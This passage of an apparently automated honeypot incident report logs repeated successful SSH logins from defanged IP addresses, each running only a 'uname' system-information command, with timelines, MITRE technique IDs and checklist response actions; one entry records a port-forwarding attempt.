| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:50` | `cowrie.session.connect` |
| `2026-07-28 05:08:50` | `cowrie.client.version` |
| `2026-07-28 05:08:50` | `cowrie.client.kex` |
| `2026-07-28 05:08:51` | `cowrie.login.success` |
| `2026-07-28 05:08:52` | `cowrie.session.params` |
| `2026-07-28 05:08:52` | `cowrie.command.input` |
| `2026-07-28 05:08:52` | `cowrie.log.closed` |
| `2026-07-28 05:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e951a26b7026

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:08 |
| **Last Seen** | 2026-07-28 05:08 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:08:56` | `cowrie.session.connect` |
| `2026-07-28 05:08:56` | `cowrie.client.version` |
| `2026-07-28 05:08:56` | `cowrie.client.kex` |
| `2026-07-28 05:08:57` | `cowrie.login.success` |
| `2026-07-28 05:08:58` | `cowrie.session.params` |
| `2026-07-28 05:08:58` | `cowrie.command.input` |
| `2026-07-28 05:08:58` | `cowrie.log.closed` |
| `2026-07-28 05:08:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08d8d2ded5d1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:02` | `cowrie.session.connect` |
| `2026-07-28 05:09:02` | `cowrie.client.version` |
| `2026-07-28 05:09:02` | `cowrie.client.kex` |
| `2026-07-28 05:09:03` | `cowrie.login.success` |
| `2026-07-28 05:09:04` | `cowrie.session.params` |
| `2026-07-28 05:09:04` | `cowrie.command.input` |
| `2026-07-28 05:09:04` | `cowrie.log.closed` |
| `2026-07-28 05:09:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-054430b19cf5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:08` | `cowrie.session.connect` |
| `2026-07-28 05:09:08` | `cowrie.client.version` |
| `2026-07-28 05:09:08` | `cowrie.client.kex` |
| `2026-07-28 05:09:09` | `cowrie.login.success` |
| `2026-07-28 05:09:10` | `cowrie.session.params` |
| `2026-07-28 05:09:10` | `cowrie.command.input` |
| `2026-07-28 05:09:10` | `cowrie.log.closed` |
| `2026-07-28 05:09:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a8eb28346c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:14` | `cowrie.session.connect` |
| `2026-07-28 05:09:14` | `cowrie.client.version` |
| `2026-07-28 05:09:14` | `cowrie.client.kex` |
| `2026-07-28 05:09:15` | `cowrie.login.success` |
| `2026-07-28 05:09:16` | `cowrie.session.params` |
| `2026-07-28 05:09:16` | `cowrie.command.input` |
| `2026-07-28 05:09:16` | `cowrie.log.closed` |
| `2026-07-28 05:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-797e949d5f0a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:20` | `cowrie.session.connect` |
| `2026-07-28 05:09:20` | `cowrie.client.version` |
| `2026-07-28 05:09:20` | `cowrie.client.kex` |
| `2026-07-28 05:09:23` | `cowrie.login.success` |
| `2026-07-28 05:09:25` | `cowrie.session.params` |
| `2026-07-28 05:09:25` | `cowrie.command.input` |
| `2026-07-28 05:09:26` | `cowrie.log.closed` |
| `2026-07-28 05:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01fde32e8ebe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:25` | `cowrie.session.connect` |
| `2026-07-28 05:09:26` | `cowrie.client.version` |
| `2026-07-28 05:09:26` | `cowrie.client.kex` |
| `2026-07-28 05:09:29` | `cowrie.login.success` |
| `2026-07-28 05:09:31` | `cowrie.session.params` |
| `2026-07-28 05:09:31` | `cowrie.command.input` |
| `2026-07-28 05:09:32` | `cowrie.log.closed` |
| `2026-07-28 05:09:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5c91ab1a36e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:32` | `cowrie.session.connect` |
| `2026-07-28 05:09:33` | `cowrie.client.version` |
| `2026-07-28 05:09:33` | `cowrie.client.kex` |
| `2026-07-28 05:09:35` | `cowrie.login.success` |
| `2026-07-28 05:09:37` | `cowrie.session.params` |
| `2026-07-28 05:09:37` | `cowrie.command.input` |
| `2026-07-28 05:09:38` | `cowrie.log.closed` |
| `2026-07-28 05:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1f5bdef5f6a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:38` | `cowrie.session.connect` |
| `2026-07-28 05:09:38` | `cowrie.client.version` |
| `2026-07-28 05:09:38` | `cowrie.client.kex` |
| `2026-07-28 05:09:41` | `cowrie.login.success` |
| `2026-07-28 05:09:44` | `cowrie.session.params` |
| `2026-07-28 05:09:44` | `cowrie.command.input` |
| `2026-07-28 05:09:44` | `cowrie.log.closed` |
| `2026-07-28 05:09:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9b62f26df9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:45` | `cowrie.session.connect` |
| `2026-07-28 05:09:45` | `cowrie.client.version` |
| `2026-07-28 05:09:45` | `cowrie.client.kex` |
| `2026-07-28 05:09:47` | `cowrie.login.success` |
| `2026-07-28 05:09:49` | `cowrie.session.params` |
| `2026-07-28 05:09:49` | `cowrie.command.input` |
| `2026-07-28 05:09:49` | `cowrie.log.closed` |
| `2026-07-28 05:09:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2053f9ff0bd0

| Field | Detail |
|---|---|
| **Source IP** | `103.103.53[.]44` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:49` | `cowrie.session.connect` |
| `2026-07-28 05:09:50` | `cowrie.client.version` |
| `2026-07-28 05:09:50` | `cowrie.client.kex` |
| `2026-07-28 05:09:52` | `cowrie.login.success` |
| `2026-07-28 05:09:53` | `cowrie.direct-tcpip.request` |
| `2026-07-28 05:09:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.103.53[.]44` to AbuseIPDB if not already reported
- [ ] Block `103.103.53[.]44` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0971314b97e5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:52` | `cowrie.session.connect` |
| `2026-07-28 05:09:52` | `cowrie.client.version` |
| `2026-07-28 05:09:52` | `cowrie.client.kex` |
| `2026-07-28 05:09:53` | `cowrie.login.success` |
| `2026-07-28 05:09:54` | `cowrie.session.params` |
| `2026-07-28 05:09:54` | `cowrie.command.input` |
| `2026-07-28 05:09:54` | `cowrie.log.closed` |
| `2026-07-28 05:09:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-844dbceef450

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:09 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:09:58` | `cowrie.session.connect` |
| `2026-07-28 05:09:58` | `cowrie.client.version` |
| `2026-07-28 05:09:58` | `cowrie.client.kex` |
| `2026-07-28 05:09:59` | `cowrie.login.success` |
| `2026-07-28 05:10:00` | `cowrie.session.params` |
| `2026-07-28 05:10:00` | `cowrie.command.input` |
| `2026-07-28 05:10:00` | `cowrie.log.closed` |
| `2026-07-28 05:10:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65a64a400a18

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:04` | `cowrie.session.connect` |
| `2026-07-28 05:10:04` | `cowrie.client.version` |
| `2026-07-28 05:10:04` | `cowrie.client.kex` |
| `2026-07-28 05:10:05` | `cowrie.login.success` |
| `2026-07-28 05:10:06` | `cowrie.session.params` |
| `2026-07-28 05:10:06` | `cowrie.command.input` |
| `2026-07-28 05:10:06` | `cowrie.log.closed` |
| `2026-07-28 05:10:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd1126ae014f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:10` | `cowrie.session.connect` |
| `2026-07-28 05:10:10` | `cowrie.client.version` |
| `2026-07-28 05:10:10` | `cowrie.client.kex` |
| `2026-07-28 05:10:11` | `cowrie.login.success` |
| `2026-07-28 05:10:12` | `cowrie.session.params` |
| `2026-07-28 05:10:12` | `cowrie.command.input` |
| `2026-07-28 05:10:12` | `cowrie.log.closed` |
| `2026-07-28 05:10:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f6a8844cd6d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:16` | `cowrie.session.connect` |
| `2026-07-28 05:10:16` | `cowrie.client.version` |
| `2026-07-28 05:10:16` | `cowrie.client.kex` |
| `2026-07-28 05:10:18` | `cowrie.login.success` |
| `2026-07-28 05:10:19` | `cowrie.session.params` |
| `2026-07-28 05:10:19` | `cowrie.command.input` |
| `2026-07-28 05:10:19` | `cowrie.log.closed` |
| `2026-07-28 05:10:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9cb577a8e6a6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:23` | `cowrie.session.connect` |
| `2026-07-28 05:10:23` | `cowrie.client.version` |
| `2026-07-28 05:10:23` | `cowrie.client.kex` |
| `2026-07-28 05:10:23` | `cowrie.login.success` |
| `2026-07-28 05:10:25` | `cowrie.session.params` |
| `2026-07-28 05:10:25` | `cowrie.command.input` |
| `2026-07-28 05:10:25` | `cowrie.log.closed` |
| `2026-07-28 05:10:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b8d48d80589f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:29` | `cowrie.session.connect` |
| `2026-07-28 05:10:29` | `cowrie.client.version` |
| `2026-07-28 05:10:29` | `cowrie.client.kex` |
| `2026-07-28 05:10:30` | `cowrie.login.success` |
| `2026-07-28 05:10:31` | `cowrie.session.params` |
| `2026-07-28 05:10:31` | `cowrie.command.input` |
| `2026-07-28 05:10:31` | `cowrie.log.closed` |
| `2026-07-28 05:10:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-368b8b55a059

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:35` | `cowrie.session.connect` |
| `2026-07-28 05:10:36` | `cowrie.client.version` |
| `2026-07-28 05:10:36` | `cowrie.client.kex` |
| `2026-07-28 05:10:36` | `cowrie.login.success` |
| `2026-07-28 05:10:37` | `cowrie.session.params` |
| `2026-07-28 05:10:37` | `cowrie.command.input` |
| `2026-07-28 05:10:37` | `cowrie.log.closed` |
| `2026-07-28 05:10:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa9b80e2efc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:42` | `cowrie.session.connect` |
| `2026-07-28 05:10:42` | `cowrie.client.version` |
| `2026-07-28 05:10:42` | `cowrie.client.kex` |
| `2026-07-28 05:10:42` | `cowrie.login.success` |
| `2026-07-28 05:10:43` | `cowrie.session.params` |
| `2026-07-28 05:10:43` | `cowrie.command.input` |
| `2026-07-28 05:10:43` | `cowrie.log.closed` |
| `2026-07-28 05:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4710309b398

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:48` | `cowrie.session.connect` |
| `2026-07-28 05:10:48` | `cowrie.client.version` |
| `2026-07-28 05:10:48` | `cowrie.client.kex` |
| `2026-07-28 05:10:48` | `cowrie.login.success` |
| `2026-07-28 05:10:49` | `cowrie.session.params` |
| `2026-07-28 05:10:49` | `cowrie.command.input` |
| `2026-07-28 05:10:50` | `cowrie.log.closed` |
| `2026-07-28 05:10:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d79a96e627b5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:10 |
| **Last Seen** | 2026-07-28 05:10 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:10:54` | `cowrie.session.connect` |
| `2026-07-28 05:10:54` | `cowrie.client.version` |
| `2026-07-28 05:10:54` | `cowrie.client.kex` |
| `2026-07-28 05:10:55` | `cowrie.login.success` |
| `2026-07-28 05:10:56` | `cowrie.session.params` |
| `2026-07-28 05:10:56` | `cowrie.command.input` |
| `2026-07-28 05:10:56` | `cowrie.log.closed` |
| `2026-07-28 05:10:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ebdefd4b177b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:00` | `cowrie.session.connect` |
| `2026-07-28 05:11:00` | `cowrie.client.version` |
| `2026-07-28 05:11:00` | `cowrie.client.kex` |
| `2026-07-28 05:11:01` | `cowrie.login.success` |
| `2026-07-28 05:11:02` | `cowrie.session.params` |
| `2026-07-28 05:11:02` | `cowrie.command.input` |
| `2026-07-28 05:11:02` | `cowrie.log.closed` |
| `2026-07-28 05:11:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f25b5bc96631

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:06` | `cowrie.session.connect` |
| `2026-07-28 05:11:06` | `cowrie.client.version` |
| `2026-07-28 05:11:06` | `cowrie.client.kex` |
| `2026-07-28 05:11:08` | `cowrie.login.success` |
| `2026-07-28 05:11:10` | `cowrie.session.params` |
| `2026-07-28 05:11:10` | `cowrie.command.input` |
| `2026-07-28 05:11:10` | `cowrie.log.closed` |
| `2026-07-28 05:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1916e3239879

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:12` | `cowrie.session.connect` |
| `2026-07-28 05:11:13` | `cowrie.client.version` |
| `2026-07-28 05:11:13` | `cowrie.client.kex` |
| `2026-07-28 05:11:15` | `cowrie.login.success` |
| `2026-07-28 05:11:17` | `cowrie.session.params` |
| `2026-07-28 05:11:17` | `cowrie.command.input` |
| `2026-07-28 05:11:18` | `cowrie.log.closed` |
| `2026-07-28 05:11:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]208` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]208` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-17fdd2922bb3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]208` |
| **First Seen** | 2026-07-28 05:11 |
| **Last Seen** | 2026-07-28 05:11 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 05:11:18` | `cowrie.session.connect` |
| `2026-07-28 05:11:18` | `cowrie.client.version` |
| `2026-07-28 05:11:18` | `cowrie.client.kex` |
| `2026-07-28 05:11:20` | `cowrie.login.success` |
| `2026-07-28 05:11:21` | `cowrie.session.params` |
| `2026-07-28 05:11:21` | `cowrie.command.input` |
| `2026-07-28 05:11:22` | `cowrie.log.closed` |
| `2026-07-28 05:11:22` | `cowrie.session.closed` |

